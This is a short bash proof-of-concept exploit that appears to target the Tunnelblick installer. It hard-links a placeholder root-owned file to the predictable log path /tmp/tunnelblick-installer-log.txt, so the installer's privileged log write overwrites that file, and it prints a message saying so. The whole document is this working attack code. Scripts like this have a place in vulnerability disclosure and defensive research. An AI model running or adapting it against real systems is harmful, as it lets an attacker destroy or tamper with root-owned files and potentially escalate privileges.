#!/bin/bash

TARGET=/path/to/some/root/owned/file
DEST=/tmp/tunnelblick-installer-log.txt

# Assume that the file is not present
ln "${TARGET}" "${DEST}"
echo "[*] Created link; once the Tunnelblick has triggered log write, ${TARGET} will be overwritten"
